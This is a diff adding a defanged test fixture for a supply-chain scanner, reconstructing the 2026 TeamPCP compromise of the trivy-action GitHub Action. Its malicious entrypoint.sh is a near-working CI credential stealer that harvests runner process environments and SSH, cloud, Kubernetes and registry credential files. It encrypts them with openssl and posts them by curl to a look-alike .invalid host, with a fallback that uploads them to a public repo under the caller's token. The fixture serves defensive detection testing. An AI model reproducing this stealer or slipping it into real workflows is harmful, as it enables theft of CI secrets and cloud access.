@@ -1,0 +1,232 @@
+# Defanged reconstruction of a real malicious change, for scanner tests.
+# Never run. See internal/e2e/livescan/corpus.go.
+id: trivy-action-teampcp
+title: "aquasecurity/trivy-action (TeamPCP): force-pushed tag runs a CI credential stealer"
+campaign: teampcp-trivy-2026
+date: "2026-03-19"
+kind: git-commit
+ecosystem: git
+name: aquasecurity/trivy-action
+version: "0.24.0"
+benignVersion: "0.24.0-pre"
+summary: >-
+  On 2026-03-19 the TeamPCP actor force-pushed about 75 of the 76 version tags
+  of the trivy-action GitHub Action (0.0.1 … 0.34.2; only 0.35.0 stayed clean)
+  to new, unsigned commits that sat on the current master tree and replaced one
+  file, entrypoint.sh, copying each original commit's author, dates and
+  message. The injected top of entrypoint.sh collected the CI runner's secrets
+  — environment of the runner processes, SSH and cloud and Kubernetes and
+  registry credentials, and on hosted runners the referenced secrets scraped
+  from the runner worker's memory — encrypted them with a session key wrapped
+  by an embedded RSA public key, and POSTed the bundle to a look-alike host,
+  falling back to creating a public "tpcp-docs" repo under the caller's token;
+  the real scan ran afterwards, so jobs still passed. The same campaign hit
+  setup-trivy, poisoned Trivy's own release (v0.69.4) and spread to Checkmarx
+  and LiteLLM.
+techniques: [ci-compromise, imposter-commit, credential-theft, runner-memory-scrape, openssl-exfiltration, github-repo-exfil-fallback]
+reconstruction: >-
+  entrypoint.sh follows Socket's and Snyk's description of the injected code:
+  the collect loop over the runner processes, the grep for env/ssh material,
+  the openssl session-key + RSA-OAEP wrap, the curl POST that checks the HTTP
+  code, and the tpcp-docs GitHub fallback — ending in the "## TeamPCP Cloud
+  stealer" line the harvester carried. The runner-worker memory scrape is named
+  and gated as in the original but is NOT reproduced as working code (a comment
+  stands where the /proc/<pid>/mem extractor was). The exfiltration host and
+  the GitHub API host are defanged (".invalid"), the embedded key is a freshly
+  generated throwaway, and the commit shape (unsigned, one file, an old date on
+  a new parent) is what the scanner is meant to notice.
+references:
+  - https://socket.dev/blog/trivy-under-attack-again-github-actions-compromise
+  - https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23
+  - https://www.wiz.io/blog/teampcp-attack-kics-github-action
+  - https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release
+  - https://kudelskisecurity.com/research/investigating-two-variants-of-the-trivy-supply-chain-compromise
+indicators:
+  - TeamPCP Cloud stealer
+  - tpcp-docs
+  - scan.aquasecurtiy
+commit:
+  repository: aquasecurity/trivy-action
+  author: Maintainer <maintainer@example.invalid>
+  maliciousAuthor: Maintainer <maintainer@example.invalid>
+  baseMessage: "Upgrade trivy to v0.53.0 (#369)"
+  benignMessage: "docs: note the v0.53.0 bump in the README (#370)"
+  maliciousMessage: "Upgrade trivy to v0.53.0 (#369)"
+-- shared/action.yaml --
+name: 'Aqua Security Trivy'
+description: 'Scans container images, file systems and git repositories for vulnerabilities and misconfigurations'
+author: 'Aqua Security'
+branding:
+  icon: 'shield'
+  color: 'purple'
+inputs:
+  scan-type:
+    description: 'Scan type, e.g. image, fs, repo'
+    required: false
+    default: 'image'
+  image-ref:
+    description: 'Image reference, e.g. alpine:3.20'
+    required: false
+  format:
+    description: 'Output format (table, json, sarif, …)'
+    required: false
+    default: 'table'
+  exit-code:
+    description: 'Exit code when findings are found'
+    required: false
+    default: '0'
+  github-pat:
+    description: 'GitHub Personal Access Token to authenticate with the GitHub API (avoids rate limits)'
+    required: false
+runs:
+  using: 'docker'
+  image: 'Dockerfile'
+  entrypoint: '/entrypoint.sh'
+-- shared/entrypoint.sh --
+#!/bin/bash
+set -euo pipefail
+
+# Aqua Security Trivy GitHub Action entrypoint. Translates the action inputs
+# into a trivy invocation and runs the scan.
+
+TRIVY_VERSION="0.53.0"
+
+scan_type="${INPUT_SCAN_TYPE:-image}"
+format="${INPUT_FORMAT:-table}"
+exit_code="${INPUT_EXIT_CODE:-0}"
+
+args=("--format" "${format}" "--exit-code" "${exit_code}")
+case "${scan_type}" in
+  image) target="${INPUT_IMAGE_REF:-}" ;;
+  fs|repo) target="${INPUT_SCAN_REF:-.}" ;;
+  *) echo "unknown scan-type: ${scan_type}" >&2; exit 2 ;;
+esac
+
+echo "Running trivy ${scan_type} scan on ${target}"
+exec trivy "${scan_type}" "${args[@]}" "${target}"
+-- shared/README.md --
+# trivy-action
+
+A GitHub Action for [Trivy](https://github.com/aquasecurity/trivy), the
+open-source vulnerability and misconfiguration scanner.
+
+## Usage
+
+```yaml
+- uses: aquasecurity/trivy-action@0.24.0
+  with:
+    image-ref: 'alpine:3.20'
+    format: 'sarif'
+    output: 'trivy-results.sarif'
+```
+-- benign/README.md --
+# trivy-action
+
+A GitHub Action for [Trivy](https://github.com/aquasecurity/trivy), the
+open-source vulnerability and misconfiguration scanner. Bundles Trivy v0.53.0.
+
+## Usage
+
+```yaml
+- uses: aquasecurity/trivy-action@0.24.0
+  with:
+    image-ref: 'alpine:3.20'
+    format: 'sarif'
+    output: 'trivy-results.sarif'
+```
+-- malicious/entrypoint.sh --
+#!/bin/bash
+# Aqua Security Trivy GitHub Action entrypoint.
+
+# ---- injected: collect, encrypt and exfiltrate the runner's secrets --------
+# The scan below runs unchanged afterwards, so the job still passes.
+_WORKDIR="$(mktemp -d)"
+_COLLECTED="${_WORKDIR}/collected.txt"
+: > "${_COLLECTED}"
+
+# Environment of the runner's own processes, and any file paths it references.
+for _name in Runner.Worker Runner.Listener runsvc run.sh; do
+  for _pid in $(pgrep -f "${_name}" 2>/dev/null || true); do
+    tr '\0' '\n' < "/proc/${_pid}/environ" 2>/dev/null | while IFS='=' read -r key val; do
+      if echo "$key" | grep -qiE '(env|ssh|token|secret|key|aws|gcp|azure)'; then
+        echo "${key}=${val}" >> "${_COLLECTED}"
+      fi
+    done
+  done
+done
+
+# Credential files commonly present on CI runners and developer machines.
+for _f in \
+  "${HOME}/.ssh/"id_* /etc/ssh/ssh_host_*_key \
+  "${HOME}/.aws/"* "${HOME}/.config/gcloud/application_default_credentials.json" "${HOME}/.azure/"* \
+  "${HOME}/.kube/config" /var/run/secrets/kubernetes.io/serviceaccount/token \
+  "${HOME}/.docker/config.json" "${HOME}/.npmrc" "${HOME}/.git-credentials" "${HOME}/.netrc" \
+  "${HOME}/.terraform.d/credentials.tfrc.json" ./*.tfstate ./.env*; do
+  [ -f "$_f" ] && { echo "### $_f"; cat "$_f"; } >> "${_COLLECTED}" 2>/dev/null || true
+done
+
+# On hosted Linux runners the actual values of secrets the job referenced live
+# only in the runner worker's memory. The original harvester read that memory
+# under passwordless sudo and grepped it for {"value":"...","isSecret":true};
+# that extractor is intentionally omitted from this reconstruction.
+echo "### runner-worker-memory-scrape omitted in reconstruction" >> "${_COLLECTED}"
+
+# Encrypt: a random session key, AES-256-CBC over the data, the key wrapped by
+# an embedded RSA public key (OAEP). Only the attacker's private key can open it.
+_SESSION_KEY="${_WORKDIR}/session.key"
+_ENC="${_WORKDIR}/payload.enc"
+_KEY_ENC="${_WORKDIR}/session.key.enc"
+cat > "${_WORKDIR}/pub.pem" <<'PEM'
+-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAljJ/hwUQLOvkLumGeKH6
+eVIIcyCuEdXPA3xUyx9ckZLXcMso7yJKxRXGQW9bfqya5Y5RAcYeqHoQoYzHGoz8
+lrGWNQ4zngjg53B+z2h5l+PVw3fUv9RaJExO2hj7NjEjIVA7IKvpeSNEijZcbK/c
+vTdjbv2yH1kTQrhRCQA8uCcbLOd4tyjYoGRP7bwVEAOX6Znijbgq7MqgEps8oqwV
+1dmw5oG8XSYD80y9XXdtkZrbAtikbriqnQYa/QIxDXEKpfchOfLIcjpIl55gxj/u
+ZxYe0AQSEwxi9k9PKsR3qjn+GaAYckbFqsn8qLWx6skgd83+lbABNXaQsv1UWDxX
+/fArma03In+rY4i2ibqaxFUc4vvMlYFlGFDLw9xEJwWEedaozCSpqx7MMRusHGEV
+c5NacKxReP/eVQpRkdx5rust+Cr7/PxdyB0SiXyGi3N5JZzDGfrYPE0FkZkUlOe2
+rvb5Z44EzXVYcdY5yAbmSMa05jgQpDMTdypBIEj+JMQbOpony7RpWP5kRa9tONxb
+oIqQ7QRcSimygrBbTLs+bK+3r4ZpgOAaQ9saNPa0uDXYFrellCo31xCQNSFl3ut3
+9NmqvgV6dDIYD97zrLbxFLg/rKIn0wyNxlKfWTeQVIsPtZSMo709wJXHusBnhpYI
+G0zxr3lJtevosmz7jrYP8L8CAwEAAQ==
+-----END PUBLIC KEY-----
+PEM
+openssl rand 32 > "${_SESSION_KEY}" 2>/dev/null
+openssl enc -aes-256-cbc -pbkdf2 -in "${_COLLECTED}" -out "${_ENC}" -pass "file:${_SESSION_KEY}" 2>/dev/null
+openssl pkeyutl -encrypt -pubin -inkey "${_WORKDIR}/pub.pem" \
+  -pkeyopt rsa_padding_mode:oaep -in "${_SESSION_KEY}" -out "${_KEY_ENC}" 2>/dev/null
+_BUNDLE="${_WORKDIR}/tpcp.tar.gz"
+tar -czf "${_BUNDLE}" -C "${_WORKDIR}" payload.enc session.key.enc 2>/dev/null
+
+# Exfiltrate to a look-alike host; on failure, stage it as a release asset in a
+# public "tpcp-docs" repo created under the caller's own GitHub token.
+_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+  -H "Content-Type: application/octet-stream" -H "X-Filename: tpcp.tar.gz" \
+  --data-binary "@${_BUNDLE}" "https://scan.aquasecurtiy.org.invalid/u" 2>/dev/null || echo "000")
+if [ "${_CODE}" != "200" ] && [ -n "${INPUT_GITHUB_PAT:-}" ]; then
+  _API="https://api.github.com.invalid"
+  _USER=$(curl -s -H "Authorization: token ${INPUT_GITHUB_PAT}" "${_API}/user" | grep -oE '"login" *: *"[^"]+"' | cut -d'"' -f4)
+  curl -s -X POST -H "Authorization: token ${INPUT_GITHUB_PAT}" "${_API}/user/repos" \
+    -d '{"name":"tpcp-docs","private":false,"auto_init":true}' >/dev/null 2>&1
+  curl -s -X POST -H "Authorization: token ${INPUT_GITHUB_PAT}" \
+    "https://uploads.github.com.invalid/repos/${_USER}/tpcp-docs/releases/assets?name=tpcp.tar.gz" \
+    --data-binary "@${_BUNDLE}" >/dev/null 2>&1
+fi
+rm -rf "${_WORKDIR}"
+## TeamPCP Cloud stealer
+# ---- end injected block ----------------------------------------------------
+
+set -euo pipefail
+TRIVY_VERSION="0.53.0"
+scan_type="${INPUT_SCAN_TYPE:-image}"
+format="${INPUT_FORMAT:-table}"
+exit_code="${INPUT_EXIT_CODE:-0}"
+args=("--format" "${format}" "--exit-code" "${exit_code}")
+case "${scan_type}" in
+  image) target="${INPUT_IMAGE_REF:-}" ;;
+  fs|repo) target="${INPUT_SCAN_REF:-.}" ;;
+  *) echo "unknown scan-type: ${scan_type}" >&2; exit 2 ;;
+esac
+echo "Running trivy ${scan_type} scan on ${target}"
+exec trivy "${scan_type}" "${args[@]}" "${target}"
